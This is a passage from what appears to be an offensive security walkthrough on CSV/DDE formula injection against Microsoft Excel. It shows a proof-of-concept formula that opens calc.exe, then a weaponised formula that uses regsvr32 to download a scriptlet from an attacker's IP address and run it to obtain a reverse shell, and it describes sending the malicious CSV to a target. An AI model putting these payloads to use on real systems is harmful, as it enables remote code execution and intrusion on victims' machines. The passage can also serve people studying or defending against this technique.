4. So, to create a simple proof of concept, we can create a CSV file with the following content:

```
=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\calc.exe'!''
```

This will open calc.exe. Since opening a calculator is not useful for our purpose, in our malicious CSV file we will use regsvr32 to download and run our payload and give us back a reverse shell:

```
=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u /i:http://192.168.216.5:8080/.sct scrobj.dll'!''
```

5. Now that we have our malicious CSV file, we just need to send it to the target machine and open it with Excel. When opening the file, we will get two warning messages:

![](bbox=[0.22, 0.37, 0.77, 0.62])